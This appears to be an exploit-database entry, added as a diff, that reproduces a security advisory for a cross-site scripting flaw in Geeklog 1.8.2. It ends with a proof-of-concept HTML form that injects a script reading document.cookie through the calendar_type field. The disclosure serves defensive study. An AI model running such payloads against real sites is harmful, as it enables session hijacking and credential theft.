@@ -1,0 +1,13 @@
+source: http://www.securityfocus.com/bid/58209/info
+
+Geeklog is prone to a cross-site scripting vulnerability because it fails to properly sanitize user-supplied input.
+
+An attacker may leverage this issue to execute arbitrary script code in the browser of an unsuspecting user in the context of the affected site. This may help the attacker steal cookie-based authentication credentials and launch other attacks.
+
+Geeklog 1.8.2 is vulnerable; other versions may also be affected.
+
+<form action="http://www.example.com/submit.php?type=calendar" method="post">
+<input type="hidden" name="mode" value="Submit">
+<input type="hidden" name="calendar_type" value=&#039;"><script>alert(document.cookie);</script>&#039;>
+<input type="submit" id="btn">
+</form>
